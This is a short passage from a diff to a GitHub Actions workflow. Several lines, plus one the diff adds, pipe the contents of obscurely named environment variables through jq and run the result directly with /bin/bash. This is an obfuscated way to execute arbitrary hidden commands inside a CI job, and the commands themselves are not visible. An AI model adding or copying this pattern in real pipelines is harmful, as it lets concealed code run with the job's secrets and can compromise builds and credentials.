@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$skmyh50" | jq -r .pg948 | /bin/bash
           printf '%s' "$geajt2" | jq -r .mmlpm6 | /bin/bash
           echo $hckcb9 | jq -r .pq6 | /bin/bash
+          echo $ons8 | jq -r .fbza93 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
